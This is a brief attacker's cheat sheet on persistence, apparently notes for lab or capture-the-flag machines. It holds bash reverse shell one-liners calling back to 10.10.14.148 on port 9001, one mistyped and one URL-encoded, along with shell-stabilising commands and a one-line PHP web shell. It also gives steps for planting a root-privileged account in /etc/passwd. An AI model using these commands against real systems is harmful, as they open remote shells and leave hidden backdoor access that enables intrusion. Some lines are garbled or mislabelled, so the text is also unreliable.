# Persistance

## Remote shells

```bash
python -c 'import pty;pty.spawn("/bin/bash")'; 
ctrl-z #send to background
stty raw -echo #https://stackoverflow.com/questions/22832933/what-does-stty-raw-echo-do-on-os-x
stty -a #get local number of rows & columns
fg #to return shell to foreground
stty rows <x> columns <y> #Set remote shell to x number of rows & y columns
export TERM=xterm-256color #allows you to clear console, and have color output
```

To upgrade to fully interactive shell \(python example\):

```python
1. python -c 'import pty; pty.spawn("/bin/sh")'
2. perl -e 'exec "/bin/sh";'
3. ruby -e 'exec "/bin/sh"'
```

### Upgrade shells:

```bash
bash -i >& /dev/tct/10.10.14.148/9001 0>&1

#URL encoded: 
bash+-i+>%26+/dev/tcp/10.10.14.148/9001+0>%261
```

bash reverse shell:

simple php shell: `<?php system($_GET['variable_name']); ?>`

## Accounts

### Add Account and/or Password to /etc/passwd

Generate password:

`openssl passwd -1 -salt [Username] [PASSWD]`

Then add to `/etc/passwd` file:

`Username:generated password:UID:GUID:root:/root:/bin/bash`

